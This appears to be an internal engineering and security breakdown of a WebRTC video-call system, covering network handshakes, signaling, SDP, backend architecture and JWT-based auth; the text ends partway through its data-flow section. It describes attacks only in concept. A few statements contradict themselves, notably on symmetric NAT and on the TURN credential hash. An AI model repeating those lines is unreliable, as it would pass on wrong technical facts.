# WebRTC Video Call System: Internal Engineering & Security Breakdown

> **Classification:** Internal Engineering / Security Document  
> **Audience:** Engineers, Security Reviewers, Interview Candidates  
> **Scope:** Full-stack WebRTC system (signaling, media, auth, security, ops)  
> **Version:** 1.0

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios (Very Detailed)](#9-attack-scenarios-very-detailed)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

This section traces every action a user takes and maps it to actual system behavior—packets sent, processes invoked, state machines advanced.

### 1.1 Pre-Call: Page Load and Authentication

**T=0ms — User opens browser and navigates to `https://calls.example.com`**

What the user sees: a loading spinner.

What actually happens:

1. Browser checks its DNS cache. If miss, queries the OS resolver, which queries the configured recursive resolver (e.g., ISP's or 8.8.8.8). The authoritative nameserver for `calls.example.com` returns an A/AAAA record (or a CNAME chain) and a TTL. The browser now has an IP address.

2. Browser initiates a TCP SYN to port 443. The server responds with SYN-ACK, browser sends ACK. One round trip. At 50ms RTT this is 50ms of dead time.

3. TLS 1.3 handshake begins: ClientHello (with supported cipher suites, key shares), ServerHello (selects cipher, sends its key share), server sends Certificate, CertificateVerify, Finished — all in one server flight. With TLS 1.3 and session resumption (PSK), this can be 0-RTT. Without resumption: 1 RTT. The browser and server derive symmetric session keys from the key exchange (ECDHE with X25519 typically). All subsequent traffic is encrypted.

4. Browser sends `GET / HTTP/2` (or HTTP/3 over QUIC if supported). Server responds with HTML, which references CSS/JS bundles.

5. JS loads and React (or Vue, Angular — product-specific) bootstraps. It checks `localStorage` or `sessionStorage` for an existing JWT/session cookie.

**T=300ms — Auth check**

6. If no stored token, the app redirects to `/login`. User enters credentials and submits the form.

7. A `POST /api/auth/login` request goes to the auth service with `{ email, password }` in the JSON body over HTTPS. The auth service hashes the password with bcrypt (or Argon2), compares against the stored hash in the users database, and if valid:
   - Issues a JWT access token (short-lived, e.g., 15 min), signed with RS256 (private key on auth service).
   - Issues a refresh token (opaque, random 256-bit value stored in Redis with user ID as value), returned as an `HttpOnly; Secure; SameSite=Strict` cookie.

8. The access token is stored in memory (JS variable, not localStorage for XSS protection). The refresh token is the cookie.

**T=500ms — Dashboard renders**

### 1.2 Initiating a Call

**T=0 (relative to call initiation) — Alice clicks "Call Bob"**

What Alice sees: "Calling Bob..." UI spinner.

What actually happens:

1. The browser calls `navigator.mediaDevices.getUserMedia({ video: true, audio: true })`. This is a browser API that triggers a permission prompt. If permission granted, the browser creates a `MediaStream` from the camera/microphone hardware. No data leaves the device yet.

2. Alice's client creates an `RTCPeerConnection` object with ICE server configuration (STUN and TURN URLs, credentials):
   ```
   new RTCPeerConnection({
     iceServers: [
       { urls: 'stun:stun.example.com:3478' },
       { urls: 'turn:turn.example.com:3478', username: '...', credential: '...' }
     ]
   })
   ```

3. The local `MediaStream` tracks are added to the peer connection via `addTrack()`. This tells the peer connection which media to eventually send.

4. Alice's client calls `createOffer()`. This triggers the WebRTC engine to:
   - Enumerate local ICE candidates (gather network interfaces)
   - Construct an SDP (Session Description Protocol) offer — a plain-text blob describing codec preferences, bandwidth, SSRC identifiers, DTLS fingerprint, and ICE ufrag/password

5. The SDP offer is set as the local description via `setLocalDescription(offer)`.

6. ICE gathering begins immediately: the browser queries each network interface for local candidates (`host` candidates), contacts the STUN server for server-reflexive candidates (`srflx`), and if configured, contacts the TURN server for relayed candidates (`relay`).

**T+50ms — Signaling: SDP sent to server**

7. Alice's client sends the SDP offer to the signaling server via WebSocket (already connected, established at page load). The WebSocket frame contains:
   ```json
   {
     "type": "offer",
     "to": "bob-user-id",
     "sdp": "v=0\r\no=- 46117...\r\n..."
   }
   ```

8. The signaling server (a stateful WebSocket server) looks up Bob's WebSocket connection in a Redis hash (`ws_connections:{bob-user-id}` → `server-node-3:connection-id`). It routes the message to the correct server node. That node pushes the offer to Bob's WebSocket.

**T+60ms — Bob's client receives offer**

9. Bob's browser receives the offer via WebSocket. It fires a notification UI ("Alice is calling").

10. Bob clicks "Accept." His browser calls `getUserMedia()`, creates its own `RTCPeerConnection`, sets Alice's SDP as the remote description via `setRemoteDescription(offer)`, and calls `createAnswer()` — which generates Bob's SDP answer (his codec preferences, his DTLS fingerprint, his ICE credentials).

11. Bob's client sends the SDP answer back through the signaling server to Alice.

**T+100ms — ICE negotiation begins**

12. Both clients have been gathering ICE candidates in parallel. As candidates are discovered, they are sent through the signaling server as `candidate` messages (trickle ICE). Each candidate contains: IP:port, transport (UDP/TCP), type (host/srflx/relay), priority.

13. Each client tests candidate pairs (Alice's IP:port ↔ Bob's IP:port) using STUN Binding Requests over UDP. The highest-priority pair that succeeds in both directions becomes the nominated pair.

**T+200ms to T+2000ms — DTLS handshake over ICE channel**

14. Once ICE connectivity check succeeds on a candidate pair, a DTLS 1.2 (or 1.3) handshake occurs over that UDP path. DTLS is TLS-over-UDP. The fingerprints exchanged in SDP are verified against the certificates presented in the DTLS handshake. This prevents MITM at the media layer.

15. SRTP keying material is derived from the DTLS master secret using the DTLS-SRTP key exporter (RFC 5764). Now all RTP media is encrypted with SRTP (AES-128-CM with HMAC-SHA1 or AES-256-GCM).

**T+2000ms — Media flows**

16. What the user sees: the video boxes go live.

What actually happens: RTP packets (audio encoded as Opus, video encoded as VP8/VP9/H.264/AV1) flow over UDP between the ICE-nominated candidate pair. Each RTP packet is encrypted with SRTP using the DTLS-derived keys. RTCP packets (sender reports, receiver reports, feedback) flow on a multiplexed port (RTCP-MUX) or the adjacent port.

---

## 2. Network Layer Flow

### 2.1 DNS Resolution

```
Browser                 OS Resolver             Recursive Resolver          Authoritative NS
   |                        |                          |                           |
   |-- getaddrinfo() ------>|                          |                           |
   |   "calls.example.com"  |                          |                           |
   |                        |-- check /etc/hosts ----  |                           |
   |                        |-- check local cache ---- |                           |
   |                        |-- if miss: UDP port 53 ->|                           |
   |                        |                          |-- root hints -> .com NS   |
   |                        |                          |-- .com NS -> example.com NS
   |                        |                          |-- example.com NS query -->|
   |                        |                          |<-- A: 203.0.113.50 TTL 300|
   |                        |<-- 203.0.113.50 ---------|                           |
   |<-- 203.0.113.50 -------|                          |                           |
```

**Details that matter:**

- DNS is **unauthenticated UDP by default**. Without DNSSEC, a resolver between the client and authority can inject fake responses (DNS spoofing/cache poisoning).
- TTL=300 means this record is cached for 5 minutes. A DNS change takes up to TTL seconds to propagate to all clients.
- DNSSEC adds a chain of cryptographic signatures from the root zone to the record. The resolver validates the signature chain. Without DNSSEC validation at the resolver, the browser gets no guarantee.
- DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT) encrypts DNS queries, preventing ISP snooping and on-path manipulation of DNS traffic, but does not eliminate the trust in the resolver itself.
- For a real-world attack: BGP route hijacking + DNS response spoofing can redirect all traffic for a domain to an attacker's server. This is a nation-state-class attack but has occurred (e.g., MyEtherWallet 2018).

### 2.2 TCP Three-Way Handshake

```
Client                                          Server (203.0.113.50:443)
  |                                                     |
  |-- SYN, seq=x ---------------------------------->    |   [SYN_SENT]
  |                                                     |   [SYN_RCVD]
  |<-- SYN-ACK, seq=y, ack=x+1 --------------------    |
  |   [ESTABLISHED]                                     |
  |-- ACK, ack=y+1 -------------------------------->    |   [ESTABLISHED]
  |                                                     |
  | <--- 1 RTT of latency before any data can flow ---> |
```

**What can fail here:**

- **SYN flood (DoS):** Attacker sends millions of SYNs with spoofed IPs. Server allocates half-open connection state for each. Mitigation: SYN cookies (server encodes state in the SYN-ACK seq number, allocates no state until ACK received).
- **TCP RST injection:** An on-path attacker can inject a RST packet to kill a connection. Requires guessing the seq number (trivially easy if attacker can observe traffic).
- **Port scan detection:** Servers can detect and block IPs sending SYNs to many closed ports.

### 2.3 TLS 1.3 Handshake

```
Client                                                   Server
  |                                                          |
  |-- ClientHello ---------------------------------------->  |
  |   [TLS 1.3, cipher suites, supported groups,             |
  |    key_share: X25519 pubkey, session ticket if any]      |
  |                                                          |
  |<-- ServerHello ----------------------------------------  |
  |    [selected cipher: TLS_AES_256_GCM_SHA384,             |
  |     key_share: server's X25519 pubkey]                   |
  |<-- {Certificate} (encrypted) -------------------------   |
  |<-- {CertificateVerify} (sig over handshake hash) ------  |
  |<-- {Finished} (HMAC over handshake) ------------------   |
  |                                                          |
  | Key derivation (both sides): ECDH(client_priv, srv_pub)  |
  | -> shared_secret -> HKDF -> handshake_keys, app_keys    |
  |                                                          |
  |-- {Finished} (HMAC) ---------------------------------->  |
  |-- {Application Data encrypted with app_keys} -------->  |
```

**Cipher suite anatomy:** `TLS_AES_256_GCM_SHA384`
- AES-256-GCM: authenticated encryption (confidentiality + integrity)
- SHA-384: hash for HKDF key derivation and transcript hash
- Key exchange (implicit in TLS 1.3): ECDHE (ephemeral, so forward secrecy)

**Certificate validation:**
1. Server sends its leaf cert + intermediate cert chain
2. Client walks the chain to a trusted root CA (embedded in OS/browser trust store)
3. Checks: valid dates, correct hostname (CN or SAN), not in CRL/OCSP revocation list
4. Verifies CertificateVerify: the server signed the handshake transcript hash with its private key. Only the legitimate cert holder can do this.

**Failure modes:**
- Expired certificate: hard failure; user sees browser error
- Hostname mismatch: hard failure
- Self-signed cert: hard failure in browsers (unless explicitly trusted)
- OCSP stapling failure: soft failure in most browsers (fail-open)
- TLS downgrade to 1.2: possible if server misconfigured; TLS 1.2 lacks mandatory forward secrecy in some cipher suites

### 2.4 Packet-Level Reasoning for WebRTC Media

WebRTC uses UDP for media, not TCP. This is critical to understand:

```
  Sender (Alice)                                    Receiver (Bob)
       |                                                  |
       |-- RTP packet (UDP, ~1200 bytes) -------------->  |
       |   [IP header][UDP header][RTP header][Payload]   |
       |   RTP Header: {V=2, PT=96, seq=1001,             |
       |                TS=48000, SSRC=0xABCD1234}        |
       |   Payload: SRTP-encrypted audio/video            |
       |                                                  |
       |-- RTCP SR (every ~5s) ------------------------>  |
       |   [Sender Report: NTP timestamp, RTP timestamp,  |
       |    packet count, byte count]                     |
       |                                                  |
       |<-- RTCP RR (Receiver Report) ------------------  |
       |    [fraction lost, cumulative lost, jitter,      |
       |     last SR timestamp, delay since last SR]      |
```

**Why UDP over TCP for media:**
- TCP retransmission adds latency. If a packet is lost, TCP halts subsequent delivery until retransmit. For real-time audio, a 200ms stall is worse than a missing frame.
- UDP drops packets. The codec (Opus, VP8) is designed for lossy networks. Concealment algorithms fill gaps.
- QUIC is emerging as an alternative (multiplexed streams, connection migration, no head-of-line blocking within streams) but WebRTC currently standardizes on RTP/UDP.

**SRTP Packet Structure:**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|V=2|P|X|  CC   |M|     PT      |       sequence number         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                           timestamp                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           synchronization source (SSRC) identifier           |
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
|            contributing source (CSRC) identifiers            |
|                             ....                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Encrypted Payload (AES-GCM)                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        SRTP Auth Tag                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

The auth tag (HMAC-SHA1 or GCM tag) covers: RTP header + encrypted payload. This provides integrity. The SSRC + seq number form a nonce for replay protection.

### 2.5 ICE: NAT Traversal Deep Dive

Most users are behind NAT (home router, corporate firewall). ICE (Interactive Connectivity Establishment, RFC 8445) solves the problem of establishing a direct UDP path.

```
Alice (192.168.1.5)          NAT A (1.2.3.4)          Internet          NAT B (5.6.7.8)         Bob (10.0.0.5)
      |                           |                        |                     |                     |
      |-- STUN Request ---------->|-- STUN Request ------->|                     |                     |
      |                           |                        |-- STUN Request ---->|                     |
      |                           |                        |<-- STUN Response ---|                     |
      |                           |<-- STUN Response ------|                     |                     |
      |<-- STUN Response ---------|                        |                     |                     |
      | srflx = 1.2.3.4:5678     |                        |                     |                     |
      |                           |                        |                     |                     |
      |=== ICE candidate pair: 1.2.3.4:5678 <-> 5.6.7.8:9012 =================>|                     |
      |== STUN Binding Request (ICE connectivity check) ==>|-- forward to Bob -->|                     |
      |                           |                        |                     |                     |
```

**ICE candidate types (priority order):**
1. `host`: directly reachable local IP (e.g., 192.168.1.5:5000). Only useful on same LAN.
2. `srflx` (server-reflexive): the public IP:port as seen by the STUN server after NAT translation. Works for symmetric or full-cone NAT. Fails for symmetric NAT (different external port per destination).
3. `prflx` (peer-reflexive): discovered during connectivity checks, the port as seen by the peer.
4. `relay`: traffic goes through the TURN server. Always works but adds latency and server load. TURN is the fallback of last resort.

**Symmetric NAT problem:** Many corporate and carrier-grade NATs assign a different external port for each different destination IP:port. So Alice's external port for STUN server ≠ her external port for Bob. STUN gives her the port for STUN, not for Bob. Solution: TURN relay.

**TURN authentication:** Uses HMAC-MD5 with a time-limited credential. The server generates `username = timestamp:userid` and `password = HMAC-SHA1(username, secret)`. The credential is only valid for a short window. This prevents unauthorized use of TURN bandwidth.

---

## 3. Application Layer Flow

### 3.1 Signaling: HTTP Upgrade to WebSocket

WebRTC requires out-of-band signaling. The signaling channel is a WebSocket connection to the server.

**HTTP Upgrade handshake:**

```
Client -> Server:
GET /ws HTTP/1.1
Host: calls.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Authorization: Bearer eyJhbGci...   ← JWT token in header

Server -> Client (101 Switching Protocols):
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

`Sec-WebSocket-Accept` = base64(SHA1(`Sec-WebSocket-Key` + `258EAFA5-E914-47DA-95CA-C5AB0DC85B11`))

This magic string is the WebSocket GUID. It proves the server understood the WebSocket upgrade (not just proxying random data). It does NOT provide security — that comes from TLS.

**After upgrade:** Full-duplex framed communication. Each WebSocket frame has:
- 1-2 bytes: FIN bit, opcode (text=1, binary=2, close=8, ping=9, pong=10), MASK bit, payload length
- 0 or 4 bytes: masking key (client→server MUST be masked; server→client unmasked)
- N bytes: payload XORed with masking key

Masking is not encryption. It prevents proxy cache poisoning (CVE-type issue where HTTP intermediaries might interpret WebSocket frames as HTTP responses).

### 3.2 REST API: Room/Session Management

Before or alongside signaling, the client makes REST API calls:

**Create a room:**
```
POST /api/v1/rooms HTTP/1.1
Authorization: Bearer eyJhbGci...
Content-Type: application/json

{ "name": "Engineering Standup", "max_participants": 10, "type": "meeting" }
```

**Server-side request processing:**

1. API Gateway receives request. Checks `Authorization` header. Passes JWT to auth middleware.

2. Auth middleware: decodes JWT header (base64), gets `alg` (must be RS256, never HS256 from untrusted source), gets `kid` (key ID). Fetches the public key for `kid` from internal JWKS endpoint. Verifies JWT signature. Checks `exp`, `iat`, `iss`, `aud` claims. If invalid: 401.

3. Rate limiting middleware: checks Redis for `rate:user:{user_id}` key. Implements token bucket or sliding window. If exceeded: 429.

4. Input validation: JSON body parsed, schema-validated (e.g., with Zod or Joi). Type checks, length limits, enum checks. Rejection on unknown fields (strip or reject — prefer reject in security-sensitive contexts).

5. Business logic: Room service creates a room record in PostgreSQL. Generates a unique room ID (UUID v4). Creates TURN credentials for the room participants.

6. Response:
```json
HTTP/1.1 201 Created
Content-Type: application/json
X-Request-ID: 8f3a-...

{
  "room_id": "550e8400-e29b-41d4-a716-446655440000",
  "join_token": "eyJhbGci...",
  "turn_credentials": {
    "urls": ["turn:turn.example.com:3478"],
    "username": "1714000000:user123",
    "credential": "HMAC-SHA1-of-above"
  },
  "expires_at": "2024-01-01T12:15:00Z"
}
```

### 3.3 SDP: What It Actually Is

SDP is not a protocol — it is a session description format (RFC 4566). It is exchanged over the signaling channel.

```
v=0
o=- 8247361842 2 IN IP4 127.0.0.1
s=-
t=0 0
a=group:BUNDLE 0 1
a=extmap-allow-mixed
a=msid-semantic: WMS abc123

m=audio 9 UDP/TLS/RTP/SAVPF 111 103 104 9 0 8
c=IN IP4 0.0.0.0
a=rtcp:9 IN IP4 0.0.0.0
a=ice-ufrag:Xd7k
a=ice-pwd:8d7aKJndiqm9xOb7nZtXEXLq
a=ice-options:trickle
a=fingerprint:sha-256 1A:2B:...:FF    ← DTLS fingerprint (prevents MITM)
a=setup:actpass
a=mid:0
a=extmap:1 urn:ietf:params:rtp-hdrext:ssrc-audio-level
a=sendrecv
a=msid:abc123 track1
a=rtcp-mux
a=rtpmap:111 opus/48000/2
a=fmtp:111 minptime=10;useinbandfec=1
a=rtcp-fb:111 transport-cc
a=ssrc:1234567 cname:alice@example.com

m=video 9 UDP/TLS/RTP/SAVPF 96 97 98
a=rtpmap:96 VP8/90000
a=rtpmap:97 rtx/90000       ← retransmission payload type
a=fmtp:97 apt=96
a=rtpmap:98 VP9/90000
a=rtcp-fb:96 goog-remb      ← receiver estimated max bitrate feedback
a=rtcp-fb:96 transport-cc
a=rtcp-fb:96 ccm fir        ← full intra-frame request
a=rtcp-fb:96 nack            ← negative acknowledgement (retransmit)
```

**Critical fields:**
- `ice-ufrag` / `ice-pwd`: shared secret for ICE connectivity checks (HMAC-SHA1). Each side has their own; both are exchanged in SDP.
- `fingerprint:sha-256`: SHA-256 hash of the DTLS certificate's DER encoding. Verified during DTLS handshake. This is what prevents MITM even if signaling is compromised.
- `ssrc`: Synchronization Source — 32-bit ID for each media stream. Used in RTP headers, RTCP, and for identifying streams in multiparty calls.
- `rtcp-fb: transport-cc`: Transport-wide Congestion Control — the receiver sends sequence numbers back; the sender uses them to estimate network congestion and adapt bitrate.

---

## 4. Backend Architecture

### 4.1 Service Topology

```
                          ┌─────────────────────────────────┐
                          │           CDN / Edge             │
                          │  (Static assets, TLS termination)│
                          └──────────────┬──────────────────┘
                                         │
                          ┌──────────────▼──────────────────┐
                          │          API Gateway              │
                          │  (Rate limit, Auth verify, Route) │
                          └────┬──────────────┬─────────────┘
                               │              │
               ┌───────────────▼──┐    ┌─────▼──────────────┐
               │   Auth Service    │    │  Signaling Service  │
               │ (JWT, sessions)   │    │  (WebSocket server) │
               └───────┬───────────┘    └──────┬─────────────┘
                       │                       │
               ┌───────▼──────────┐    ┌───────▼──────────┐
               │   Users DB        │    │  Redis Cluster    │
               │  (PostgreSQL)     │    │  (WS connections, │
               └──────────────────┘    │   presence, rooms) │
                                       └──────────────────┘
                                       
               ┌──────────────────┐    ┌──────────────────┐
               │  Room Service    │    │   TURN/STUN       │
               │ (CRUD, tokens)   │    │   Servers         │
               └───────┬──────────┘    └──────────────────┘
                       │
               ┌───────▼──────────┐    ┌──────────────────┐
               │   Rooms DB        │    │  Media SFU        │
               │  (PostgreSQL)     │    │  (Selective       │
               └──────────────────┘    │   Forwarding Unit)│
                                       └──────────────────┘
               ┌──────────────────┐
               │  Notification    │
               │  Service (push,  │
               │  email, webhook) │
               └──────────────────┘
```

### 4.2 Signaling Service (Stateful WebSocket Server)

This is the most architecturally interesting service. It must:
- Maintain persistent WebSocket connections (stateful — cannot be trivially horizontally scaled without coordination)
- Route messages between connected clients
- Track presence (who is online, in which room)

**Scaling problem:** If Alice connects to Node A and Bob connects to Node B, how does Alice's message reach Bob?

**Solution: Redis Pub/Sub or Redis Streams**

```
Alice → Node A → Redis Pub/Sub channel "user:bob" → Node B → Bob
```

Each server node subscribes to all user channels for connected users. When a message arrives for Bob, it publishes to `user:bob`. All nodes receive it; only Node B (which has Bob's connection) forwards it.

**Connection state in Redis:**
```
HSET ws_registry user:{bob_id} node:{B}:conn:{conn_id}
EXPIRE ws_registry user:{bob_id} 30   ← TTL refreshed by heartbeat
```

**Heartbeat:** Server sends WebSocket PING frame every 20s. Client responds with PONG. If no PONG received in 10s, connection considered dead, presence cleaned up.

### 4.3 Media SFU (Selective Forwarding Unit)

For group calls (3+ participants), peer-to-peer is not viable. Alice would need to upload N copies of her video — one for each participant. Upload bandwidth becomes the bottleneck.

**SFU architecture:**
- Every participant sends media TO the SFU (one upload stream)
- The SFU receives all streams and forwards relevant ones to each participant
- The SFU does NOT decode/transcode; it forwards RTP packets (sometimes with SSRC rewriting)
- Each receiver still decodes locally

```
Alice ──upload──► SFU ──forward Alice's stream──► Bob
                  │   ──forward Alice's stream──► Carol
Bob ───upload──►  │   ──forward Bob's stream───► Alice
Carol ─upload──►  │   ──forward Bob's stream───► Carol
                      ──forward Carol's stream─► Alice
                      ──forward Carol's stream─► Bob
```

**Simulcast:** Alice encodes 3 spatial layers (low/medium/high resolution). She sends all 3 to the SFU. The SFU forwards the appropriate layer to each receiver based on their bandwidth (small window on mobile → low layer; desktop with good connection → high layer). This is controlled via `a=simulcast:send h;m;l` in SDP.

**SVC (Scalable Video Coding):** VP9 and AV1 support SVC where a single bitstream contains multiple quality layers. The SFU can drop higher-layer packets without breaking lower layers. More efficient than simulcast but more complex.

### 4.4 Database Interactions

**PostgreSQL schema (simplified):**

```sql
CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    email TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,   -- Argon2id hash
    created_at TIMESTAMPTZ DEFAULT NOW(),
    last_seen_at TIMESTAMPTZ
);

CREATE TABLE rooms (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name TEXT,
    created_by UUID REFERENCES users(id),
    created_at TIMESTAMPTZ DEFAULT NOW(),
    expires_at TIMESTAMPTZ,
    max_participants INTEGER DEFAULT 10,
    status TEXT DEFAULT 'active'   -- active, ended, archived
);

CREATE TABLE room_participants (
    room_id UUID REFERENCES rooms(id),
    user_id UUID REFERENCES users(id),
    joined_at TIMESTAMPTZ DEFAULT NOW(),
    left_at TIMESTAMPTZ,
    role TEXT DEFAULT 'participant',   -- host, participant
    PRIMARY KEY (room_id, user_id)
);

CREATE TABLE call_recordings (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    room_id UUID REFERENCES rooms(id),
    s3_key TEXT,
    started_at TIMESTAMPTZ,
    ended_at TIMESTAMPTZ,
    size_bytes BIGINT,
    encryption_key_id TEXT   -- KMS key reference
);
```

**Read patterns:** Room metadata is read-heavy (every participant joining checks room status). Cached in Redis with TTL matching expected call duration.

**Write patterns:** `room_participants` has an insert on join and an update on leave. In a 100-person call, this is 100 inserts close in time — needs proper index and connection pooling (PgBouncer in transaction mode).

### 4.5 Async Flows: Event Queue

Events like call ended, recording completed, billing tallied — these are async. They go through a message queue (Kafka or RabbitMQ).

```
Call Service          Kafka Topic              Workers
    |                    |                        |
    |-- "call.ended" --->| call-events            |
    |   { room_id,       |<---- consumer group ---|-- Billing Worker
    |     duration,      |                        |   (updates usage record)
    |     participants } |<---- consumer group ---|-- Analytics Worker
    |                    |                        |   (updates dashboards)
                         |<---- consumer group ---|-- Recording Worker
                                                  |   (finalizes S3 upload)
```

**Why Kafka:** Messages are retained for 7 days. Multiple consumer groups can independently read the same event stream without competing. If a worker crashes and restarts, it resumes from its last committed offset. Exactly-once semantics (with idempotent producers + transactional consumers).

### 4.6 Caching Architecture

```
Request -> Redis L1 Cache -> PostgreSQL
              |
              └── Cache miss: fetch from DB, store in Redis with TTL
              └── Cache hit: return directly (~0.5ms vs ~5ms DB)

CDN (Cloudflare/Fastly):
  - Static assets: JS bundles, CSS — cached at edge, keyed by content hash
  - API responses: NOT cached (auth-dependent, user-specific)
  - TURN/STUN server IPs: cached in client DNS with low TTL
```

Redis key design:
```
room:{room_id}:meta         -> room details JSON (TTL: 3600s)
room:{room_id}:participants -> set of user_ids (TTL: 3600s)
user:{user_id}:session      -> session data (TTL: 900s, refreshed on activity)
rate:user:{user_id}:api     -> request count (TTL: 60s sliding window)
turn:cred:{user_id}         -> TURN credential (TTL: 300s)
```

---

## 5. Authentication & Authorization Flow

### 5.1 Token Architecture

Two-token system, standard pattern:

```
┌────────────────────────────────────────────────────────────────┐
│ Access Token (JWT)                                             │
│ ─────────────────                                              │
│ Header: { alg: "RS256", kid: "key-2024-01" }                  │
│ Payload: {                                                     │
│   sub: "user-uuid",                                            │
│   iss: "https://auth.example.com",                             │
│   aud: "https://calls.example.com",                            │
│   exp: 1714000900,   ← 15 minutes from issue                  │
│   iat: 1714000000,                                             │
│   jti: "unique-token-id",  ← for revocation                   │
│   roles: ["user"],                                             │
│   email: "alice@example.com"                                   │
│ }                                                              │
│ Signature: RS256(header.payload, auth_service_private_key)     │
└────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────┐
│ Refresh Token                                                  │
│ ─────────────                                                  │
│ Opaque: 256-bit random value (crypto.randomBytes(32))          │
│ Stored: Redis key "refresh:{hash_of_token}" -> user_id         │
│ Sent: HttpOnly; Secure; SameSite=Strict cookie                 │
│ Lifetime: 30 days (rolling expiry on each use)                 │
└────────────────────────────────────────────────────────────────┘
```

**Why RS256 instead of HS256?**
- HS256: symmetric. Any service that can verify tokens can also forge them. One compromised microservice can create tokens for any user.
- RS256: asymmetric. Private key on auth service only. All other services use the public key to verify. Cannot forge without the private key.

### 5.2 Token Flow

```
[Login]
  Client → POST /auth/login { email, password }
  Auth Service:
    1. Hash password with Argon2id (memory=64MB, iterations=3, parallelism=2)
    2. Compare with stored hash (constant-time comparison to prevent timing attack)
    3. If valid:
       - Generate access_token (JWT, RS256, exp=15m)
       - Generate refresh_token (random bytes, store hash in Redis)
       - Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Strict; Path=/auth
    4. Return access_token in response body
  Client stores access_token in memory (JS variable, not localStorage)

[Authenticated API call]
  Client → GET /api/rooms/123
           Authorization: Bearer {access_token}
  API Gateway:
    1. Extract JWT from header
    2. Verify signature using JWKS (public key fetched from auth service, cached)
    3. Check exp, iss, aud
    4. Check jti against revocation list (Redis set "revoked_jtis")
    5. Pass user claims to downstream service in trusted internal header

[Token refresh]
  Client detects access_token is about to expire (check exp claim)
  Client → POST /auth/refresh
           Cookie: refresh_token=...
  Auth Service:
    1. Extract refresh token from cookie
    2. Hash it, look up in Redis
    3. If found: issue new access_token, rotate refresh_token (delete old, issue new)
    4. If not found: 401, force re-login

[Logout]
  Client → POST /auth/logout
           Authorization: Bearer {access_token}
  Auth Service:
    1. Add jti to revoked_jtis Redis set (TTL = remaining access_token lifetime)
    2. Delete refresh_token from Redis
    3. Clear cookie
```

### 5.3 Room-Level Authorization

Not every authenticated user can join every room. Room join requires a `join_token`:

```
Room Service issues join_token when user creates or is invited to room:
  join_token = JWT {
    sub: user_id,
    room_id: "550e...",
    role: "participant",  // or "host"
    exp: +2hours
  }

On WebSocket "join room" message:
  1. Client sends join_token
  2. Signaling server verifies join_token (signature, exp, room_id)
  3. Checks room status (not ended, not full)
  4. Adds user to room participant set in Redis
  5. Notifies other participants via pub/sub
```

### 5.4 Trust Boundaries

```
[Internet] ← TLS boundary → [API Gateway] ← internal mTLS → [Microservices]

Trust boundary 1: Internet / API Gateway
  - All requests must present valid TLS cert on server side
  - API Gateway validates JWT signature before forwarding
  - No raw user input reaches internal services unvalidated

Trust boundary 2: API Gateway / Microservices
  - Internal traffic uses mTLS (mutual TLS) — each service has a certificate
  - Service identity is established by certificate, not by IP
  - User identity propagated via trusted headers (X-User-ID: ...) set by gateway

Trust boundary 3: Browser / WebRTC
  - DTLS fingerprints exchanged in SDP prevent media MITM
  - Even if signaling is compromised, media cannot be intercepted without valid DTLS cert
```

---

## 6. Data Flow

### 6.1 Signaling Data Flow

```
Alice's Browser                 Signaling Server              Bob's Browser
      |                               |                              |
      | [1] WS: {type:"offer",        |                              |
      |          sdp:"v=0..."}        |                              |
      |-----------------------------> |                              |
      |                               | [2] Look up Bob's WS conn   |
      |                               |     in Redis                |
      |                               | [3] Pub/Sub to Bob's node   |
      |                               |----------------------------> |
      |                               |                              | [4] Deliver to Bob
      |                               |                              |     via WS frame
      | [5] WS: {type:"answer"...}    |                              |
      |<------------------------------|<-----------------------------|
      | [6] WS: {type:"candidate"...} |                              |
      |-----------------------------> | --------------------------> |
      |                               |                              |
      | [7] WS: {type:"candidate"...} |                              |
      |<------------------------------|<-----------------------------|
```

**Serialization:** All signaling messages are JSON (UTF-8). SDP strings inside JSON are not re-escaped — they contain `\r\n` which is JSON-escaped as `\\r\\n`. Some implementations use binary WebSocket frames for efficiency but text is standard.

### 6.2 Media Data Flow

```
Camera → MediaStream → RTCPeerConnection → ICE transport → Network
                            |
                            ├── encode (VP8/H.264/AV1 via libvpx/openh264/libaom)
                            ├── packetize into RTP packets (max ~1200 bytes to avoid IP fragmentation)
                            ├── encrypt with SRTP (keys from DTLS)
                            └── send via UDP socket

Network → ICE transport → RTCPeerConnection → MediaStream → <video> element
                            |
                            ├── decrypt SRTP
